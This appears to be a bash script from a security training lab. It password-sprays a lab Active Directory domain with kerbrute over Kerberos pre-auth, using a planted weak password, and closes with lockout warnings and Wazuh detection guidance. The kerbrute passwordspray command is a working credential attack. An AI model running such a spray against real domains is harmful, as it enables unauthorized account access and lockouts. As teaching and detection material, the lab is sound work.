#!/usr/bin/env bash
# Lab 02 — Password spraying via Kerberos pre-auth (low lockout risk, high signal).
# MITRE ATT&CK: T1110.003 (Password Spraying)
set -uo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${HERE}/../lib/common.sh"

echo "== Lab 02: Password spraying =="
confirm_lab
ensure_kerbrute || exit 1

USERFILE="$(mktemp)"; LAB_USERS_LIST > "$USERFILE"
: "${SPRAY_PASSWORD:=Summer2025!}"   # matches the planted weak svc_sql password

warn "Spraying ONE password across many users. In a real domain this can lock"
warn "accounts out — know the lockout policy first. Kerbrute uses Kerberos"
warn "pre-auth, which is lower-risk and very visible in the logs (event 4768/4771)."
echo

step "Spray '${SPRAY_PASSWORD}' across: $(paste -sd' ' "$USERFILE")"
kerbrute passwordspray -d "$DOMAIN" --dc "$DC_IP" "$USERFILE" "$SPRAY_PASSWORD" || true
rm -f "$USERFILE"

cat <<EOF

${C_G}What just happened:${C_0}
  Each guess = a Kerberos AS-REQ. A valid password returns a TGT (a hit);
  a wrong one is rejected. The DC logs both.
EOF

hunt "In Wazuh (agent soc-dc01): a burst of 4768 (TGT requested) and 4771 (pre-auth failed) from one source across MANY accounts in a short window is the classic spray signature. Failed NTLM shows as 4776 / 4625. See 02-password-spray/DETECTION.md."
ok "Lab 02 complete."
